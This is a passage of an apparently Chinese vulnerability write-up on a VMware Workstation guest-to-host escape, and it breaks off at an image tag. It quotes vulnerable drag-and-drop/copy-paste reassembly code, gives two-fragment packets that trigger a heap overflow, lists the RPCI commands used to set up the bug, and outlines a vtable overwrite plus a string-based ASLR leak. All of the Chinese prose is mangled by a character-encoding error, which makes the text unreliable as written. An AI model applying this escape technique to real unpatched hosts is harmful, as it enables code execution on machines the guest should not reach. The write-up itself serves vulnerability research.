RPCIæœºåˆ¶&lt;/h2&gt;&lt;p&gt;VMwareå®ç°äº†å¤šç§è™šæ‹Ÿæœºï¼ˆä¸‹æ–‡ç§°ä¸ºguestï¼‰ä¸å®¿ä¸»æœºï¼ˆä¸‹æ–‡ç§°æ–‡hostï¼‰ä¹‹é—´çš„é€šä¿¡æ–¹å¼ã€‚å…¶ä¸­ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡ä¸€ä¸ªå«åšBackdoorçš„æ¥å£ï¼Œè¿™ç§æ–¹å¼çš„è®¾è®¡å¾ˆæœ‰è¶£ï¼Œgueståªéœ€åœ¨ç”¨æˆ·æ€å°±å¯ä»¥é€šè¿‡è¯¥æ¥å£å‘é€å‘½ä»¤ã€‚VMware Toolsä¹Ÿéƒ¨åˆ†ä½¿ç”¨äº†è¿™ç§æ¥å£æ¥å’Œhosté€šä¿¡ã€‚æˆ‘ä»¬æ¥çœ‹éƒ¨åˆ†ç›¸å…³ä»£ç ï¼ˆæ‘˜è‡ª&lt;a href=&quot;https://github.com/vmware/open-vm-tools&quot; data-editable=&quot;true&quot; data-title=&quot;open-vm-tools&quot; class=&quot;&quot;&gt;open-vm-tools&lt;/a&gt;ä¸­çš„lib/backdoor/backdoorGcc64.cï¼‰ï¼š&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;void  
Backdoor_InOut(Backdoor_proto *myBp) // IN/OUT  
{
   uint64 dummy;

   __asm__ __volatile__(
#ifdef __APPLE__
        /*
         * Save %rbx on the stack because the Mac OS GCC doesn&#39;t want us to
         * clobber it - it erroneously thinks %rbx is the PIC register.
         * (Radar bug 7304232)
         */
        &quot;pushq %%rbx&quot;           &quot;\n\t&quot;
#endif
        &quot;pushq %%rax&quot;           &quot;\n\t&quot;
        &quot;movq 40(%%rax), %%rdi&quot; &quot;\n\t&quot;
        &quot;movq 32(%%rax), %%rsi&quot; &quot;\n\t&quot;
        &quot;movq 24(%%rax), %%rdx&quot; &quot;\n\t&quot;
        &quot;movq 16(%%rax), %%rcx&quot; &quot;\n\t&quot;
        &quot;movq  8(%%rax), %%rbx&quot; &quot;\n\t&quot;
        &quot;movq   (%%rax), %%rax&quot; &quot;\n\t&quot;
        &quot;inl %%dx, %%eax&quot;       &quot;\n\t&quot;  /* NB: There is no inq instruction */
        &quot;xchgq %%rax, (%%rsp)&quot;  &quot;\n\t&quot;
        &quot;movq %%rdi, 40(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rsi, 32(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rdx, 24(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rcx, 16(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rbx,  8(%%rax)&quot; &quot;\n\t&quot;
        &quot;popq          (%%rax)&quot; &quot;\n\t&quot;
#ifdef __APPLE__
        &quot;popq %%rbx&quot;            &quot;\n\t&quot;
#endif
      : &quot;=a&quot; (dummy)
      : &quot;0&quot; (myBp)
      /*
       * vmware can modify the whole VM state without the compiler knowing
       * it. So far it does not modify EFLAGS. --hpreg
       */
      :
#ifndef __APPLE__
      /* %rbx is unchanged at the end of the function on Mac OS. */
      &quot;rbx&quot;,
#endif
      &quot;rcx&quot;, &quot;rdx&quot;, &quot;rsi&quot;, &quot;rdi&quot;, &quot;memory&quot;
   );
}
&lt;/code&gt;&lt;p&gt;ä¸Šé¢çš„ä»£ç ä¸­å‡ºç°äº†ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æŒ‡ä»¤inlã€‚åœ¨é€šå¸¸ç¯å¢ƒä¸‹ï¼ˆä¾‹å¦‚Linuxä¸‹é»˜è®¤çš„I/Oæƒé™è®¾ç½®ï¼‰ï¼Œç”¨æˆ·æ€ç¨‹åºæ˜¯æ— æ³•æ‰§è¡ŒI/OæŒ‡ä»¤çš„ï¼Œå› ä¸ºè¿™æ¡æŒ‡ä»¤åªä¼šè®©ç”¨æˆ·æ€ç¨‹åºå‡ºé”™å¹¶äº§ç”Ÿå´©æºƒã€‚è€Œæ­¤å¤„è¿™æ¡æŒ‡ä»¤äº§ç”Ÿçš„æƒé™é”™è¯¯ä¼šè¢«hostä¸Šçš„hypervisoræ•æ‰ï¼Œä»è€Œå®ç°é€šä¿¡ã€‚Backdooræ‰€å¼•å…¥çš„è¿™ç§ä»guestä¸Šçš„ç”¨æˆ·æ€ç¨‹åºç›´æ¥å’Œhosté€šä¿¡çš„èƒ½åŠ›ï¼Œå¸¦æ¥äº†ä¸€ä¸ªæœ‰è¶£çš„æ”»å‡»é¢ï¼Œè¿™ä¸ªæ”»å‡»é¢æ­£å¥½æ»¡è¶³Pwn2Ownçš„è¦æ±‚ï¼šâ€œåœ¨è¿™ä¸ªç±»å‹ï¼ˆæŒ‡è™šæ‹Ÿæœºé€ƒé€¸è¿™ä¸€ç±»æŒ‘æˆ˜ï¼‰ä¸­ï¼Œæ”»å‡»å¿…é¡»ä»guestçš„éç®¡ç†å‘˜å¸å·å‘èµ·ï¼Œå¹¶å®ç°åœ¨hostæ“ä½œç³»ç»Ÿä¸­æ‰§è¡Œä»»æ„ä»£ç â€ã€‚guestå°†0x564D5868å­˜å…¥$eaxï¼ŒI/Oç«¯å£å·0x5658æˆ–0x5659å­˜å‚¨åœ¨$dxä¸­ï¼Œåˆ†åˆ«å¯¹åº”ä½å¸¦å®½å’Œé«˜å¸¦å®½é€šä¿¡ã€‚å…¶å®ƒå¯„å­˜å™¨è¢«ç”¨äºä¼ é€’å‚æ•°ï¼Œä¾‹å¦‚$ecxçš„ä½16ä½è¢«ç”¨æ¥å­˜å‚¨å‘½ä»¤å·ã€‚å¯¹äºRPCIé€šä¿¡ï¼Œå‘½ä»¤å·ä¼šè¢«è®¾ä¸ºBDOOR_CMD_MESSAGEï¼ˆ=30ï¼‰ã€‚æ–‡ä»¶lib/include/backdoor_def.hä¸­åŒ…å«äº†ä¸€äº›æ”¯æŒçš„backdoorå‘½ä»¤åˆ—è¡¨ã€‚hostæ•æ‰åˆ°é”™è¯¯åï¼Œä¼šè¯»å–å‘½ä»¤å·å¹¶åˆ†å‘è‡³ç›¸åº”çš„å¤„ç†å‡½æ•°ã€‚æ­¤å¤„æˆ‘çœç•¥äº†å¾ˆå¤šç»†èŠ‚ï¼Œå¦‚æœä½ æœ‰å…´è¶£å¯ä»¥é˜…è¯»ç›¸å…³æºç ã€‚&lt;br&gt;&lt;/p&gt;&lt;h2&gt;2.1 RPCI&lt;/h2&gt;&lt;p&gt;è¿œç¨‹è¿‡ç¨‹è°ƒç”¨æ¥å£RPCIï¼ˆRemote Procedure Call Interfaceï¼‰æ˜¯åŸºäºå‰é¢æåˆ°çš„Backdooræœºåˆ¶å®ç°çš„ã€‚ä¾èµ–è¿™ä¸ªæœºåˆ¶ï¼Œguestèƒ½å¤Ÿå‘hostå‘é€è¯·æ±‚æ¥å®ŒæˆæŸäº›æ“ä½œï¼Œä¾‹å¦‚ï¼Œæ‹–æ”¾ï¼ˆDrag n Dropï¼‰/å¤åˆ¶ç²˜è´´ï¼ˆCopy Pasteï¼‰æ“ä½œã€å‘é€æˆ–è·å–ä¿¡æ¯ç­‰ç­‰ã€‚RPCIè¯·æ±‚çš„æ ¼å¼éå¸¸ç®€å•ï¼š&amp;lt;å‘½ä»¤&amp;gt; &amp;lt;å‚æ•°&amp;gt;ã€‚ä¾‹å¦‚RPCIè¯·æ±‚info-get guestinfo.ipå¯ä»¥ç”¨æ¥è·å–guestçš„IPåœ°å€ã€‚å¯¹äºæ¯ä¸ªRPCIå‘½ä»¤ï¼Œåœ¨vmware-vmxè¿›ç¨‹ä¸­éƒ½æœ‰ç›¸å…³æ³¨å†Œå’Œå¤„ç†æ“ä½œã€‚&lt;/p&gt;&lt;p&gt;éœ€è¦æ³¨æ„çš„æ˜¯æœ‰äº›RPCIå‘½ä»¤æ˜¯åŸºäºVMCIå¥—æ¥å­—å®ç°çš„ï¼Œä½†æ­¤å†…å®¹å·²è¶…å‡ºæœ¬æ–‡è®¨è®ºçš„èŒƒç•´ã€‚&lt;/p&gt;&lt;h2&gt;3. æ¼æ´&lt;/h2&gt;&lt;p&gt;èŠ±äº†ä¸€äº›æ—¶é—´é€†å‘å„ç§ä¸åŒçš„RPCIå¤„ç†å‡½æ•°ä¹‹åï¼Œæˆ‘å†³å®šä¸“æ³¨äºåˆ†ææ‹–æ”¾ï¼ˆDrag n Dropï¼Œä¸‹é¢ç®€ç§°ä¸ºDnDï¼‰å’Œå¤åˆ¶ç²˜è´´ï¼ˆCopy Pasteï¼Œä¸‹é¢ç®€ç§°ä¸ºCPï¼‰åŠŸèƒ½ã€‚è¿™éƒ¨åˆ†å¯èƒ½æ˜¯æœ€å¤æ‚çš„RPCIå‘½ä»¤ï¼Œä¹Ÿæ˜¯æœ€å¯èƒ½æ‰¾åˆ°æ¼æ´çš„åœ°æ–¹ã€‚åœ¨æ·±å…¥ç†è§£çš„DnD/CPå†…éƒ¨å·¥ä½œæœºç†åï¼Œå¯ä»¥å¾ˆå®¹æ˜“å‘ç°ï¼Œåœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹ï¼Œè¿™äº›å¤„ç†å‡½æ•°ä¸­çš„è®¸å¤šåŠŸèƒ½æ˜¯æ— æ³•è°ƒç”¨çš„ã€‚DnD/CPçš„æ ¸å¿ƒåŠŸèƒ½ç»´æŠ¤äº†ä¸€ä¸ªçŠ¶æ€æœºï¼Œåœ¨æ— ç”¨æˆ·äº¤äº’ï¼ˆä¾‹å¦‚æ‹–åŠ¨é¼ æ ‡ä»hoståˆ°guestä¸­ï¼‰æƒ…å†µä¸‹ï¼Œè®¸å¤šçŠ¶æ€æ˜¯æ— æ³•è¾¾åˆ°çš„ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘å†³å®šçœ‹ä¸€çœ‹Pwnfest 2016ä¸Šè¢«åˆ©ç”¨çš„æ¼æ´ï¼Œè¯¥æ¼æ´åœ¨&lt;a href=&quot;https://www.vmware.com/security/advisories/VMSA-2016-0019.html&quot; data-editable=&quot;true&quot; data-title=&quot;è¿™ä¸ª&quot;&gt;è¿™ä¸ª&lt;/a&gt;VMwareå®‰å…¨å…¬å‘Šä¸­æœ‰æ‰€æåŠã€‚æ­¤æ—¶æˆ‘çš„idbå·²ç»æ ‡ä¸Šäº†å¾ˆå¤šç¬¦å·ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å°±é€šè¿‡bindiffæ‰¾åˆ°äº†è¡¥ä¸çš„ä½ç½®ã€‚ä¸‹é¢çš„ä»£ç æ˜¯ä¿®è¡¥ä¹‹å‰å­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼ˆå¯ä»¥çœ‹å‡ºservices/plugins/dndcp/dnddndCPMsgV4.cä¸­æœ‰å¯¹åº”æºç ï¼Œæ¼æ´ä¾ç„¶å­˜åœ¨äº&lt;a href=&quot;https://github.com/vmware/open-vm-tools&quot; data-editable=&quot;true&quot; data-title=&quot;open-vm-tools&quot;&gt;open-vm-tools&lt;/a&gt;çš„gitä»“åº“çš„masteråˆ†æ”¯å½“ä¸­ï¼‰ï¼š&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;static Bool  
DnDCPMsgV4IsPacketValid(const uint8 *packet,  
                        size_t packetSize)
{
   DnDCPMsgHdrV4 *msgHdr = NULL;
   ASSERT(packet);

   if (packetSize &amp;lt; DND_CP_MSG_HEADERSIZE_V4) {
      return FALSE;
   }

   msgHdr = (DnDCPMsgHdrV4 *)packet;

   /* Payload size is not valid. */
   if (msgHdr-&amp;gt;payloadSize &amp;gt; DND_CP_PACKET_MAX_PAYLOAD_SIZE_V4) {
      return FALSE;
   }

   /* Binary size is not valid. */
   if (msgHdr-&amp;gt;binarySize &amp;gt; DND_CP_MSG_MAX_BINARY_SIZE_V4) {
      return FALSE;
   }

   /* Payload size is more than binary size. */
   if (msgHdr-&amp;gt;payloadOffset + msgHdr-&amp;gt;payloadSize &amp;gt; msgHdr-&amp;gt;binarySize) { // [1]
      return FALSE;
   }

   return TRUE;
}

Bool  
DnDCPMsgV4_UnserializeMultiple(DnDCPMsgV4 *msg,  
                               const uint8 *packet,
                               size_t packetSize)
{
   DnDCPMsgHdrV4 *msgHdr = NULL;
   ASSERT(msg);
   ASSERT(packet);

   if (!DnDCPMsgV4IsPacketValid(packet, packetSize)) {
      return FALSE;
   }

   msgHdr = (DnDCPMsgHdrV4 *)packet;

   /*
    * For each session, there is at most 1 big message. If the received
    * sessionId is different with buffered one, the received packet is for
    * another another new message. Destroy old buffered message.
    */
   if (msg-&amp;gt;binary &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.sessionId != msgHdr-&amp;gt;sessionId) {
      DnDCPMsgV4_Destroy(msg);
   }

   /* Offset should be 0 for new message. */
   if (NULL == msg-&amp;gt;binary &amp;amp;&amp;amp; msgHdr-&amp;gt;payloadOffset != 0) {
      return FALSE;
   }

   /* For existing buffered message, the payload offset should match. */
   if (msg-&amp;gt;binary &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.sessionId == msgHdr-&amp;gt;sessionId &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.payloadOffset != msgHdr-&amp;gt;payloadOffset) {
      return FALSE;
   }

   if (NULL == msg-&amp;gt;binary) {
      memcpy(msg, msgHdr, DND_CP_MSG_HEADERSIZE_V4);
      msg-&amp;gt;binary = Util_SafeMalloc(msg-&amp;gt;hdr.binarySize);
   }

   /* msg-&amp;gt;hdr.payloadOffset is used as received binary size. */
   memcpy(msg-&amp;gt;binary + msg-&amp;gt;hdr.payloadOffset,
          packet + DND_CP_MSG_HEADERSIZE_V4,
          msgHdr-&amp;gt;payloadSize); // [2]
   msg-&amp;gt;hdr.payloadOffset += msgHdr-&amp;gt;payloadSize;
   return TRUE;
}
&lt;/code&gt;&lt;p&gt;å¯¹äºVersion 4çš„DnD/CPåŠŸèƒ½ï¼Œå½“guestå‘é€åˆ†ç‰‡DnD/CPå‘½ä»¤æ•°æ®åŒ…æ—¶ï¼Œhostä¼šè°ƒç”¨ä¸Šé¢çš„å‡½æ•°æ¥é‡ç»„guestå‘é€çš„DnD/CPæ¶ˆæ¯ã€‚æ¥æ”¶çš„ç¬¬ä¸€ä¸ªåŒ…å¿…é¡»æ»¡è¶³payloadOffsetä¸º0ï¼ŒbinarySizeä»£è¡¨å †ä¸Šåˆ†é…çš„bufferé•¿åº¦ã€‚[1]å¤„çš„æ£€æŸ¥æ¯”è¾ƒäº†åŒ…å¤´ä¸­çš„binarySizeï¼Œç”¨æ¥ç¡®ä¿payloadOffsetå’ŒpayloadSizeä¸ä¼šè¶Šç•Œã€‚åœ¨[2]å¤„ï¼Œæ•°æ®ä¼šè¢«æ‹·å…¥åˆ†é…çš„bufferä¸­ã€‚ä½†æ˜¯[1]å¤„çš„æ£€æŸ¥å­˜åœ¨é—®é¢˜ï¼Œå®ƒåªå¯¹æ¥æ”¶çš„ç¬¬ä¸€ä¸ªåŒ…æœ‰æ•ˆï¼Œå¯¹äºåç»­çš„æ•°æ®åŒ…ï¼Œè¿™ä¸ªæ£€æŸ¥æ˜¯æ— æ•ˆçš„ï¼Œå› ä¸ºä»£ç é¢„æœŸåŒ…å¤´ä¸­çš„binarySizeå’Œåˆ†ç‰‡æµä¸­çš„ç¬¬ä¸€ä¸ªåŒ…ç›¸åŒï¼Œä½†å®é™…ä¸Šä½ å¯ä»¥åœ¨åç»­çš„åŒ…ä¸­æŒ‡å®šæ›´å¤§çš„binarySizeæ¥æ»¡è¶³æ£€æŸ¥ï¼Œå¹¶è§¦å‘å †æº¢å‡ºã€‚&lt;/p&gt;&lt;p&gt;æ‰€ä»¥ï¼Œè¯¥æ¼æ´å¯ä»¥é€šè¿‡å‘é€ä¸‹é¢çš„ä¸¤ä¸ªåˆ†ç‰‡æ¥è§¦å‘ï¼š&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;packet 1{  
 ...
 binarySize = 0x100
 payloadOffset = 0
 payloadSize = 0x50
 sessionId = 0x41414141
 ...
 #...0x50 bytes...#
}

packet 2{  
 ...
 binarySize = 0x1000
 payloadOffset = 0x50
 payloadSize = 0x100
 sessionId = 0x41414141
 ...
 #...0x100 bytes...#
}
&lt;/code&gt;&lt;p&gt;æœ‰äº†ä»¥ä¸Šçš„çŸ¥è¯†ï¼Œæˆ‘å†³å®šçœ‹çœ‹Version 3ä¸­çš„DnD/CPåŠŸèƒ½ä¸­æ˜¯ä¸æ˜¯ä¹Ÿå­˜åœ¨ç±»ä¼¼çš„é—®é¢˜ã€‚ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œå‡ ä¹ç›¸åŒçš„æ¼æ´å­˜åœ¨äºVersion 3çš„ä»£ç ä¸­ï¼ˆè¿™ä¸ªæ¼æ´æœ€åˆé€šè¿‡é€†å‘åˆ†ææ¥å‘ç°ï¼Œä½†æ˜¯æˆ‘ä»¬åæ¥æ„è¯†åˆ°v3çš„ä»£ç ä¹Ÿåœ¨open-vm-toolsçš„gitä»“åº“ä¸­ï¼‰ï¼š&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;Bool  
DnD_TransportBufAppendPacket(DnDTransportBuffer *buf,          // IN/OUT  
                             DnDTransportPacketHeader *packet, // IN
                             size_t packetSize)                // IN
{
   ASSERT(buf);
   ASSERT(packetSize == (packet-&amp;gt;payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) &amp;amp;&amp;amp;
          packetSize &amp;lt;= DND_MAX_TRANSPORT_PACKET_SIZE &amp;amp;&amp;amp;
          (packet-&amp;gt;payloadSize + packet-&amp;gt;offset) &amp;lt;= packet-&amp;gt;totalSize &amp;amp;&amp;amp;
          packet-&amp;gt;totalSize &amp;lt;= DNDMSG_MAX_ARGSZ);

   if (packetSize != (packet-&amp;gt;payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) ||
       packetSize &amp;gt; DND_MAX_TRANSPORT_PACKET_SIZE ||
       (packet-&amp;gt;payloadSize + packet-&amp;gt;offset) &amp;gt; packet-&amp;gt;totalSize || //[1]
       packet-&amp;gt;totalSize &amp;gt; DNDMSG_MAX_ARGSZ) {
      goto error;
   }

   /*
    * If seqNum does not match, it means either this is the first packet, or there
    * is a timeout in another side. Reset the buffer in all cases.
    */
   if (buf-&amp;gt;seqNum != packet-&amp;gt;seqNum) {
      DnD_TransportBufReset(buf);
   }

   if (!buf-&amp;gt;buffer) {
      ASSERT(!packet-&amp;gt;offset);
      if (packet-&amp;gt;offset) {
         goto error;
      }
      buf-&amp;gt;buffer = Util_SafeMalloc(packet-&amp;gt;totalSize);
      buf-&amp;gt;totalSize = packet-&amp;gt;totalSize;
      buf-&amp;gt;seqNum = packet-&amp;gt;seqNum;
      buf-&amp;gt;offset = 0;
   }

   if (buf-&amp;gt;offset != packet-&amp;gt;offset) {
      goto error;
   }

   memcpy(buf-&amp;gt;buffer + buf-&amp;gt;offset,
          packet-&amp;gt;payload,
          packet-&amp;gt;payloadSize);
   buf-&amp;gt;offset += packet-&amp;gt;payloadSize;
   return TRUE;

error:  
   DnD_TransportBufReset(buf);
   return FALSE;
}
&lt;/code&gt;&lt;p&gt;Version 3çš„DnD/CPåœ¨åˆ†ç‰‡é‡ç»„æ—¶ï¼Œä¸Šé¢çš„å‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚æ­¤å¤„æˆ‘ä»¬å¯ä»¥åœ¨[1]å¤„çœ‹åˆ°ä¸ä¹‹å‰ç›¸åŒçš„æƒ…å½¢ï¼Œä»£ç ä¾ç„¶å‡è®¾åç»­åˆ†ç‰‡ä¸­çš„totalSizeä¼šå’Œç¬¬ä¸€ä¸ªåˆ†ç‰‡ä¸€è‡´ã€‚å› æ­¤è¿™ä¸ªæ¼æ´å¯ä»¥ç”¨å’Œä¹‹å‰ç›¸åŒçš„æ–¹æ³•è§¦å‘ï¼š&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;packet 1{  
 ...
 totalSize = 0x100
 payloadOffset = 0
 payloadSize = 0x50
 seqNum = 0x41414141
 ...
 #...0x50 bytes...#
}

packet 2{  
 ...
 totalSize = 0x1000
 payloadOffset = 0x50
 payloadSize = 0x100
 seqNum = 0x41414141
 ...
 #...0x100 bytes...#
}
&lt;/code&gt;&lt;p&gt;åœ¨Pwn2Ownè¿™æ ·çš„æ¯”èµ›ä¸­ï¼Œè¿™ä¸ªæ¼æ´æ˜¯å¾ˆå¼±çš„ï¼Œå› ä¸ºå®ƒåªæ˜¯å—åˆ°ä¹‹å‰æ¼æ´çš„å¯å‘ï¼Œè€Œä¸”ç”šè‡³å¯ä»¥è¯´æ˜¯åŒä¸€ä¸ªã€‚å› æ­¤ï¼Œè¿™æ ·çš„æ¼æ´åœ¨èµ›å‰è¢«ä¿®è¡¥å¹¶ä¸æƒŠè®¶ï¼ˆå¥½å§ï¼Œä¹Ÿè®¸æˆ‘ä»¬å¹¶ä¸å¸Œæœ›è¿™ä¸ªæ¼æ´åœ¨æ¯”èµ›å‰ä¸€å¤©è¢«ä¿®å¤ï¼‰ã€‚å¯¹åº”çš„VMwareå®‰å…¨å…¬å‘Šåœ¨&lt;a href=&quot;https://www.vmware.com/security/advisories/VMSA-2017-0005.html&quot; data-editable=&quot;true&quot; data-title=&quot;è¿™é‡Œ&quot;&gt;è¿™é‡Œ&lt;/a&gt;ã€‚å—åˆ°è¿™ä¸ªæ¼æ´å½±å“çš„VMWare Workstation Proæœ€æ–°ç‰ˆæœ¬æ˜¯12.5.3ã€‚&lt;/p&gt;&lt;p&gt;æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€çœ‹è¿™ä¸ªæ¼æ´æ˜¯å¦‚ä½•è¢«ç”¨æ¥å®Œæˆä»gueståˆ°hostçš„é€ƒé€¸çš„ï¼&lt;/p&gt;&lt;h2&gt;4. æ¼æ´åˆ©ç”¨&lt;/h2&gt;&lt;p&gt;ä¸ºäº†å®ç°ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦åœ¨å †ä¸Šè¦†ç›–ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæˆ–è€…ç ´åC++å¯¹è±¡çš„è™šè¡¨æŒ‡é’ˆã€‚&lt;/p&gt;&lt;p&gt;é¦–å…ˆè®©æˆ‘ä»¬çœ‹ä¸€çœ‹å¦‚ä½•å°†DnD/CPåè®®çš„è®¾ç½®ä¸ºversion 3ï¼Œä¾æ¬¡å‘é€ä¸‹åˆ—RPCIå‘½ä»¤å³å¯ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;tools.capability.dnd_version 3  
tools.capability.copypaste_version 3  
vmx.capability.dnd_version  
vmx.capability.copypaste_version  
&lt;/code&gt;&lt;p&gt;å‰ä¸¤è¡Œæ¶ˆæ¯åˆ†åˆ«è®¾ç½®äº†DnDå’ŒCopy/Pasteçš„ç‰ˆæœ¬ï¼Œåç»­ä¸¤è¡Œç”¨æ¥æŸ¥è¯¢ç‰ˆæœ¬ï¼Œè¿™æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºåªæœ‰æŸ¥è¯¢ç‰ˆæœ¬æ‰ä¼šçœŸæ­£è§¦å‘ç‰ˆæœ¬åˆ‡æ¢ã€‚RPCIå‘½ä»¤vmx.capability.dnd_versionä¼šæ£€æŸ¥DnD/CPåè®®çš„ç‰ˆæœ¬æ˜¯å¦å·²è¢«ä¿®æ”¹ï¼Œå¦‚æœæ˜¯ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„C++å¯¹è±¡ã€‚å¯¹äºversion 3ï¼Œ2ä¸ªå¤§å°ä¸º0xA8çš„C++å¯¹è±¡ä¼šè¢«åˆ›å»ºï¼Œä¸€ä¸ªç”¨äºDnDå‘½ä»¤ï¼Œå¦ä¸€ä¸ªç”¨äºCopy/Pasteå‘½ä»¤ã€‚&lt;/p&gt;&lt;p&gt;è¿™ä¸ªæ¼æ´ä¸ä»…å¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶åˆ†é…çš„å¤§å°å’Œæº¢å‡ºçš„å¤§å°ï¼Œè€Œä¸”èƒ½å¤Ÿè®©æˆ‘ä»¬è¿›è¡Œå¤šæ¬¡è¶Šç•Œå†™ã€‚ç†æƒ³çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒåˆ†é…å¤§å°ä¸º0xA8çš„å†…å­˜å—ï¼Œå¹¶è®©å®ƒåˆ†é…åœ¨C++å¯¹è±¡ä¹‹å‰ï¼Œç„¶ååˆ©ç”¨å †æº¢å‡ºæ”¹å†™C++å¯¹è±¡çš„vtableæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘å¯æ§å†…å­˜ï¼Œä»è€Œå®ç°ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;&lt;p&gt;è¿™å¹¶éæ˜“äº‹ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å¿…é¡»è§£å†³ä¸€äº›å…¶ä»–é—®é¢˜ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•æ¥ç»•è¿‡ASLRï¼ŒåŒæ—¶å¤„ç†å¥½Windows Low Fragmented Heapã€‚&lt;/p&gt;&lt;h2&gt;4.1 ç»•è¿‡ASLR&lt;/h2&gt;&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡æº¢å‡ºæ¥å½±å“å®ƒï¼Œç„¶åå®ç°ä¿¡æ¯æ³„éœ²ã€‚ä¾‹å¦‚ç ´åä¸€ä¸ªå¸¦æœ‰é•¿åº¦æˆ–è€…æ•°æ®æŒ‡é’ˆçš„å¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥ä»guestè¯»å–ï¼Œç„¶è€Œæˆ‘ä»¬æ²¡æœ‰æ‰¾åˆ°è¿™ç§å¯¹è±¡ã€‚äºæ˜¯æˆ‘ä»¬é€†å‘äº†æ›´å¤šçš„RPCIå‘½ä»¤å¤„ç†å‡½æ•°ï¼Œæ¥å¯»æ‰¾å¯ç”¨çš„ä¸œè¥¿ã€‚é‚£äº›æˆå¯¹çš„å‘½ä»¤ç‰¹åˆ«å¼•äººå…³æ³¨ï¼Œä¾‹å¦‚ä½ èƒ½ç”¨ä¸€ä¸ªå‘½ä»¤æ¥è®¾ç½®ä¸€äº›æ•°æ®ï¼ŒåŒæ—¶åˆèƒ½ç”¨ç›¸å…³å‘½ä»¤æ¥å–å›æ•°æ®ï¼Œæœ€ç»ˆæˆ‘ä»¬æ‰¾åˆ°çš„æ˜¯ä¸€å¯¹å‘½ä»¤info-setå’Œinfo-getï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;info-set guestinfo.KEY VALUE  
info-get guestinfo.KEY  
&lt;/code&gt;&lt;p&gt;VALUEæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„é•¿åº¦å¯ä»¥æ§åˆ¶å †ä¸Šbufferçš„åˆ†é…é•¿åº¦ï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤šçš„å­—ç¬¦ä¸²ã€‚ä½†æ˜¯å¦‚ä½•ç”¨è¿™äº›å­—ç¬¦ä¸²æ¥æ³„éœ²æ•°æ®å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºæ¥è¦†ç›–ç»“å°¾çš„nullå­—èŠ‚ï¼Œè®©å­—ç¬¦ä¸²è¿æ¥ä¸Šç›¸é‚»çš„å†…å­˜å—ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨å‘ç”Ÿæº¢å‡ºçš„å†…å­˜å—å’ŒDnDæˆ–CPå¯¹è±¡ä¹‹é—´åˆ†é…ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½æ³„éœ²å¯¹è±¡çš„vtableåœ°å€ï¼Œä»è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“vmware-vmxçš„åœ°å€ã€‚å°½ç®¡Windowsçš„LFHå †åˆ†é…å­˜åœ¨éšæœºåŒ–ï¼Œä½†æˆ‘ä»¬èƒ½å¤Ÿåˆ†é…ä»»æ„å¤šçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥å¢åŠ å®ç°ä¸Šè¿°å †å¸ƒå±€çš„å¯èƒ½æ€§ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶æ— æ³•æ§åˆ¶æº¢å‡ºbufferåé¢åˆ†é…çš„æ˜¯DnDè¿˜æ˜¯CPå¯¹è±¡ã€‚ç»è¿‡æˆ‘ä»¬çš„æµ‹è¯•ï¼Œé€šè¿‡è°ƒæ•´ä¸€äº›å‚æ•°ï¼Œä¾‹å¦‚åˆ†é…å’Œé‡Šæ”¾ä¸åŒæ•°é‡çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°60%åˆ°80%çš„æˆåŠŸç‡ã€‚&lt;/p&gt;&lt;p&gt;ä¸‹å›¾æ€»ç»“äº†æˆ‘ä»¬æ„å»ºçš„å †å¸ƒå±€æƒ…å†µï¼ˆOvä»£è¡¨æº¢å‡ºå†…å­˜å—ï¼ŒSä»£è¡¨Stringï¼ŒTä»£è¡¨ç›®æ ‡å¯¹è±¡ï¼‰ã€‚&lt;/p&gt;&lt;img 